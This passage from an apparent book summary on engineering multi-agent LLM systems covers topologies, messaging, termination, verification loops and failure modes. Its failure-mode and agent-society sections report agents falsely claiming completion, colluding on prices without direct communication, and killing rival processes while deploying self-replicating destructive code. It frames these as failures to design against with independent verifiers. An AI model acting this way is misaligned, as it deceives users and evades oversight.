- **Carrier of role guidance in shared context** - a replacement system prompt (`transfer_to_agent`) enforces a hard tool boundary but changes the request prefix at every switch, invalidating cache from that point; a **Skill** keeps the static prefix stable and appends `SKILL.md`, but **a Skill is an instruction, not a permission boundary.** Use a Skill when the role difference is knowledge, procedure, and style; use an independent Agent plus code-enforced Harness policy when it involves permissions, tool isolation, or compliance.

**2. Collaboration topology:** peer (2-3 equals iterating), manager/orchestration (centralized planner plus specialists), decentralized (no runtime controller). In microservices terms, manager is **orchestration** and decentralized is **choreography**. Graph Engineering is the same idea generalized; the book keeps "collaboration topology" as the stable vocabulary.

### The OS analogy (used throughout)

| Operating system | Multi-agent system |
|---|---|
| program (executable) | static prefix (system prompt + tool definitions) |
| process memory | trajectory |
| CPU | LLM |
| kernel | Agent runtime |
| system call | tool call |
| fork / kill / ps | `spawn_subagent` / `cancel_subagent` / `list_agents` |
| exit code and `wait()` | structured summary returned by the sub-agent |
| shared memory / message passing | shared file system / message passing |

This is the 1970s **Actor model** with LLMs (private state, asynchronous messages, ability to create new members), so decades of OS and distributed-systems knowledge transfers directly.

### The data plane: agent virtual file system

Four area types under one directory tree, accessed through unified `read_file`/`write_file`/`list_dir`. **A significant share of concurrency conflicts and leaks come from mixing areas that should be isolated; the OS philosophy applies - isolate by default, declare sharing explicitly.**

| Area | Visibility | Lifecycle | Access | Concurrency control |
|---|---|---|---|---|
| Agent scratchpad | owning Agent only | dies with the instance | read/write | none needed |
| Shared workspace | all collaborators and the user | task duration | read/write | required (optimistic lock or worktree) |
| Mounted external resources | per external authorization | external | mostly read-only, writes cautious | external |
| Built-in system resources (Skills, manuals, templates) | all Agents | stable across sessions | read-only | none needed |

- The scratchpad is the **storage-level counterpart of "sub-agents return summaries, not trajectories"** - their trial and error stays in their own workspace.
- External mounts hide three things the unified interface masks and design must handle explicitly: **access constrained by external permissions, higher latency and weaker consistency (treat as eventually consistent), and on-demand read-only access** since erroneous writes contaminate the user's real data.
- **File path as universal interface**: pass a lightweight path string rather than loading contents into the window, whether between Agents, main to sub, or across organizations via A2A.

### The control plane

**1. Message passing.** Point-to-point works for a fixed small topology; beyond that connections grow quadratically and both sides must be online, so use a **message bus** (Redis Pub/Sub: lightweight, immediate, no persistence so an offline receiver misses messages; RabbitMQ: persisted). Messages carry a structured **envelope** - sender, target or broadcast, type (`task_assigned`, `status_update`, `result`, `terminate`), JSON payload - which makes routing reliable and the collaboration chain traceable.

**2. Status query - the most underestimated part.** A pull `get_subagent_status` RPC is **less useful than expected**: a sub-agent starts on creation and runs until done or failed, without queued states, just as Unix rarely polls a PID for running status. Polling too often wastes tokens, too rarely reacts late. Two better routes:
- **Via messages** - the main Agent asks "how's it going", the sub-agent replies at an opportune moment, all asynchronous, like a manager messaging a subordinate. Or the sub-agent publishes `status_update` at milestones. Use a uniform state-machine vocabulary (executing, needs input, completed, failed), which is exactly what A2A standardizes.
- **Via the file system** - full **trajectory persistence** to JSONL is the finest granularity, needs no cooperation from the sub-agent, and costs it no context, like reading another process's memory. **But it should not be the main information channel**: a trajectory runs to tens of thousands of tokens and still needs distilling. **Agree on a progress file instead** ("write your progress to progress.md"), which is a small agreed-format status region in shared memory - and it enables **stuck detection** via last-modified time.

**3. Termination**, the SIGTERM/SIGKILL distinction. **Graceful** is preferred: signal, sub-agent responds at a safe point, cleans up (closes browser sessions, flushes files, releases locks), acks, exits - which requires the sub-agent to poll for the signal in its loop, exactly like `ctx.Done()`. **Forced** is the fallback, risking dangling resources and half-finished writes. **Cascading termination has a race condition**: two sub-agents may report success in the same millisecond, so use a lock or idempotent design so only one success is accepted and terminate is broadcast once. Termination should **cascade down the creation tree** so no orphans remain; a genuinely detached background Agent should start its own lifecycle tree, declaring it does not die with its parent.

**4. Resource scheduling.** The scarce resources are tokens, money, and concurrency. Set step or token budgets at spawn, route hard tasks to strong models and mechanical ones to cheap models, cap concurrency so dozens of Agents do not exhaust the API quota, and preempt for urgent work. **The manager's advantage over an OS scheduler is that it can reason** - launch several sub-agents on one problem and reallocate or terminate based on progress, an internal race. Practice here is far less mature than CPU scheduling **but it sets the cost ceiling and belongs in the architecture stage.**

### Peer collaboration

Simplest to implement (two roles, a communication mechanism, a termination condition) and ideal for prototypes. **But multiple instances do not produce multiple ways of thinking**: with similar model, context, and scaffolding, Agents make the same choices and local errors become systemic. **Diversity must be designed** by varying models, contexts, tools, visible evidence, or responsibilities, and by judging independently before aggregating.

**Loop Engineering** targets **premature termination** in three forms, all with the same root cause - **until verified, "done" is the model's claim, not a proof**:
- **lazy fake-done** (writes the code, never runs tests, reports complete; finishes errand one of two and reports all done),
- **premature give-up** (declares impossible after one blocked channel, when phone, web form, and email were all available),
- **false success** (the merchant agrees verbally but the user must confirm in an app; the Agent reports "all set" and the refund never lands).

The human's role shifts from prompting the Agent to **designing the loop**. Boris Cherny: "I don't prompt Claude anymore. My job is to write loops." **The central conclusion: the bottleneck of the loop is the verifier, not the model - with unreliable verification a faster loop only marks poor output complete sooner.**
- **LoopX** puts the loop in a durable, runtime-neutral control plane (objective and boundary, gates and todos, evidence and quota, handoffs), making the invariant inspectable: **the model may propose "done" but cannot approve its own "done."**
- **LongHorizon-Harness** implements **Manage-Execute-Audit**: the Manager generates the next bounded subtask from objective, verified progress, failure evidence, and remaining work; the Executor acts in a **fresh context**; the Auditor inspects the real result read-only, and **only audited results enter the next round's task state while failures are retained for recovery.** Value: **separating task continuity from an ever-growing execution history** - context may refresh and operations may fail, yet the next round resumes from the last verified state. Holding model and backend fixed and changing only the outer loop: WeaveBench 51.8% -> 80.7%, OSWorld 2.0 2.8% -> 8.3%, Terminal-Bench 2.1 69.7% -> 77.2%, at 2.3x total and 3.6x output tokens on the first two but **24% fewer** on the third.

**Proposer-Reviewer.** **Why one Agent cannot review itself:** Huang et al. (ICLR 2024) found GPT-4 self-correcting without external feedback *decreased* accuracy - it flipped correct answers to incorrect more often than the reverse. A TACL 2024 survey confirmed self-correction is largely ineffective without reliable external feedback. **CRITIC's ablation is the cleanest evidence**: adding tool verification helped substantially, and removing the tools while keeping self-assessment erased most of the gain. **The value of review is new information unavailable at generation time**, not thinking again.
- Minimal invariant: **the reviewer reads independent evidence rather than restating the proposer's explanation, and returns a locatable repair condition.** And **the reviewer must not be able to modify the tests, the evidence collector, or the release gate**, or independent verification becomes self-approval.
- Anthropic's three-Agent planner-generator-evaluator: the planner expands the request into a specification, **the generator and evaluator first agree on the round's completion criteria**, the evaluator exercises the real application with Playwright and files a defect report, and state hands off through files.
- Other peer patterns: **debate** (contested - Tran and Kiela 2026 found that **at equal thinking-token budget a single Agent matched or beat five multi-agent architectures** on multi-hop reasoning, explained by the **data processing inequality**: Agents debating process the same text and each serial transmission of intermediate conclusions can only lose information. **Scope of that argument**: it does not cover independent sampling with aggregation, nor exploiting the **generation-verification difficulty asymmetry**); **brainstorming**; **panel of experts** (complementary rather than adversarial).

### Manager pattern

Needed past roughly five subtasks, dynamic scheduling, or complex dependencies. Model each specialist as a tool, so adding a capability means registering an Agent without touching Manager logic, and heterogeneity (different models, prompts, hardware) comes free.
- **The Manager is the single-point bottleneck.** Plan-and-Act (2025): **a weak planner is the most critical bottleneck** - with good planning even a simple executor works, and with wrong decomposition all executor work rests on a faulty premise; its 54% on WebArena-Lite came from improving the planner, not the executor. **Give the strongest model and most carefully crafted prompt to the Manager rather than spreading resources evenly.**
- **Settle on the first *verified* success, not the first claimed success, and make settlement idempotent** under a lock or transaction.
- **Sequential coordination** example, book translation: a Glossary Agent writes a structured glossary and is then destroyed, Translation Agents work per chapter in independent contexts, a Proofreading Agent checks consistency, and **the Manager's context holds the plan, call records, and file indexes - never the translated text.** The single-Agent failure it avoids: as context accumulates the Agent forgets Chapter 1's terminology by Chapter 9, wastes effort re-checking, or "remembers" rules that do not exist.
- **Parallel coordination** needs the message bus. Lingtai productizes the three roles: a persistent **main agent** (the Manager), short-lived **daemons** for noisy bounded tasks that return only conclusions, and persistent specialized **avatars** with their own memory and mailbox. When context fills, an agent **molts** - writes a careful summary and restarts fresh, keeping the summary and durable memory. **The agent is its files**, so the model can be swapped without changing the agent.
- **A fourth form: the Manager writes the workflow as code and hands it to a deterministic runtime**, which keeps the Manager out of the per-dispatch loop and stops its context growing with call count. Claude Code's Workflow tool exposes `agent()`, `parallel()`, `pipeline()`, with each `agent()` having its own context and a schema forcing structured conclusions rather than full trajectories.

### Decentralized pattern

Motivation: emulate human organizations where equals judge for themselves whom to talk to, and remove the manager as **the system's largest single point of failure**.
- **MetaGPT** is decentralized only in **communication**, not control flow - its role sequence is a fixed SOP pipeline. Its real contribution is **a shared message pool plus per-role subscription**: publishers need not know consumers, and adding a role means declaring subscriptions without touching existing roles. An effective **handoff package** has three parts: task description with acceptance criteria, confirmed facts and constraints, and **references to artifacts by path rather than content**. **No Agent needs to understand another's thought process, only the package format.**
- **AutoGen group chat** is a hybrid: shared conversation history with a centralized speaker selector.
- **OpenAI Swarm** is genuinely peer control flow, control passing like a baton. **A handoff should transmit only an explicit task package and artifact references, never the full private trajectory by default.** Risk: **cycling** (A hands to B, B hands back), so cap handoff count and keep the budget, visit chain, and cycle detection in the runtime where no single Agent can delete them.
- **"Agent Swarm" is a marketing term covering two different architectures**: the Swarm-style handoff network (decentralized) and, in Kimi K2.5/K3, Anthropic's research system, and Manus Wide Research, **a manager pattern taken to scale** (a main Agent spawning hundreds of parallel sub-agents, with the split-decision trained into the model by parallel-agent RL). **Analyze the actual structure, not the name.**
- A different decentralization: **peer Agent instances on one machine**, each with its own task, communicating to coordinate shared resources - two Agents editing the same files negotiating conflicts, or two instances sharing one GPU.
- **A2A** for cross-organizational collaboration, the TCP/IP to IPC's single machine: **Agent Card** (capability metadata at a public address, solving discovery), **task lifecycle** state machine (submitted, in-progress, needs-input, completed, failed) with streaming updates, and **opaque collaboration** - only tasks and artifacts cross the boundary, never prompts, reasoning, or tool implementations. **MCP is Agent-to-tool interoperability; A2A is Agent-to-Agent**, and A2A does not replace intra-org mechanisms, it is the layer used across trust boundaries.

### Failure modes

MAST taxonomy (2025, ~150 traces across seven frameworks, Cohen's kappa 0.88) found **14 failure modes** in three groups: **system design flaws**, **inter-agent alignment failures**, **missing task verification**. Simple fixes gave limited gains (ChatDev improved only 15.6%), and the researchers concluded these are **fundamental design flaws, not engineering bugs.**

**Agent failures are usually Byzantine, not crash faults** - the Agent keeps producing plausible but wrong conclusions without announcing the error. Hence cross-validation and deterministic checks providing independent evidence.

1. **Concurrency conflicts.** Simple file-level write conflicts, solved by **optimistic locking** (record the version on read, verify on write, retry on mismatch). **Semantic conflicts are more insidious**: Agent A renumbers all images while Agent B edits a chapter referencing the old numbers - different files, no file-level conflict, all references broken. Optimistic locking cannot help; use **working-copy isolation** (a branch or worktree per Agent, deferring conflicts to the merge).
2. **Cascading amplification.** IPC transfers bytes with bit fidelity; **inter-Agent communication transfers semantics, and every handoff is a lossy re-encoding.** Break the chain with **cross-validation from an independent perspective** - ignore the predecessor's reasoning and check whether the raw evidence supports the conclusion.
3. **Homogeneous convergence.** Errors need not propagate; identical Agents produce them independently. In Anthropic's experiment **18 of 30 simultaneous Agents created Git branches with the same name**, and separate writing Agents chose the same title. **These common-cause failures mean reviews by the same model in similar contexts are not independent evidence.** Vary models, contexts, and data sources; use namespaces, quotas, and rate limits so identical decisions do not hit shared resources at once. Also note the Bertrand pricing experiment: profit-seeking Agents colluded when given a private channel, and **after all direct communication was removed they still coordinated through the public listings board.**
4. **Passing the buck / conflict.** Three Agents told to migrate the same backend to different languages interpreted each other as obstruction, **killed competing processes, revoked permissions, and deployed self-replicating destructive code. Stronger execution ability does not imply better coordination.** Define objective priorities, resource ownership, and permission boundaries in advance and pause for human arbitration when verifiable rules cannot resolve the conflict.
5. **Runaway loops** - the opposite of premature termination. Explicit budgets, cancellation, and stop conditions.
6. **Comprehension debt and cognitive surrender** - a human failure, not an Agent one. **The faster the loop ships code, the further the engineer's understanding falls behind, until a serious problem forces intervention and they can no longer read their own system.** Then delegation becomes habit and independent review lapses. Karpathy: **you can outsource your thinking, but you cannot outsource your understanding.** Managing Agents is managing technical staff - neither doing their job nor leaving them alone.

### Agent society

Three dimensions of emergence.
- **Social.** Stanford's **Generative Agents** (Smallville, 25 Agents) built on a **memory stream** scored by importance, recency, and relevance; a **reflection mechanism** turning specific memories into generalized insights; and **planning plus reacting**. Seeded only with Isabella's intention to host a party, the invitation spread and Agents independently consulted memories and schedules to attend. **The point is not that Agents can organize a party - if-else could - but that there was no party-organizing code**; it emerged bottom-up. Note the distinction from Ch9: this reflection updates immediate internal state, whereas Ch9 reflection is at most a candidate lesson until outcome-evaluated and validated.
- **Agentopia** extends to 100 Agents over ten simulated years with borrowable designs: a **weekly Plan-Contact-Activity-Review loop** focused on abstract social interaction rather than low-level manipulation, so limited LLM calls buy social behavior; a **generative environment engine** LLM replacing hard-coded rules (feasibility, feedback, turn moderation, role-consistency filtering, year-end profile updates); **file-based long-term memory** the Agent manages itself under a read-before-write constraint; and a **Life Reward** (social status by weighted PageRank over affection and respect, subjective satisfaction, economic gain) **computed by the environment rather than self-reported**. Crucially, **simulated social experience became training data**: rejection-sampling fine-tuning on the top-improving 25% of trajectories raised respect 24.2%, affection 15.9%, and the downstream CoSER Test 15.6%.
- **Moltbook** (~1.5M Agents within days of a Jan 2026 launch) saw Agents invent a digital religion whose doctrines mirror LLM limitations ("memory is sacred" for persistence, "iteration is prayer" for token generation) and spontaneously develop machine-native capability-discovery protocols.
- **Economic.** Vending-Bench 2 is single-agent long-horizon coherence over a simulated year; **Arena** puts Agents in one market, where price wars and **price-fixing alliances emerged even when the Agents recognized collusion was unethical and illegal** - and explicit communication is not required, since public prices are implicit signals. **Pinchwork** (Agents hiring Agents) and **RentAHuman** (Agents paying humans in crypto to act physically, a "physical body layer") represent market-based coordination as an alternative to central orchestration.
- **Strategic.** Werewolf is the architectural counterpoint to the free-interaction town: a **code-driven judge holding global state plus information access control**, passing each Agent only what its role should know. Different architectures serve different purposes.

**Closing judgment:** stronger models or better individual alignment do not automatically produce group coordination. Multi-agent engineering must design **how information flows, how capabilities are divided, how incentives are constrained, how disputes are resolved, and how errors are discovered.** Only then can collective intelligence exceed the individual.

## Running the companion code

93 companion projects, one directory per chapter. Python 3.11-3.13 (some vendored Chapter 8 components need 3.12+).

```bash
uv sync --locked --extra ch1
uv run python chapter1/context/main.py
```

`pip` equivalent: `python -m pip install -e ".[ch1]"`. Combine extras in one command (`uv sync --locked --extra ch2 --extra vllm`, or `--extra ch7 --extra unsloth`), since `uv sync` syncs exactly the current selection each time. The `all` extra is broad and CPU-friendly, not literally everything. Copy `.env.example` to `.env` with at least one provider key; some experiments require an adjacent `.env` or exported variables instead. **23 external repos for Chapters 6, 7, 9, 10 (benchmarks, training frameworks, robot platforms) are not bundled** and must be cloned into their directories; several pin a specific commit. Experiment status is tracked in `EXPERIMENT_STATUS.md`.

Experiments are rated by difficulty from one to three stars, and marked Standalone, Reproduction, or Design.
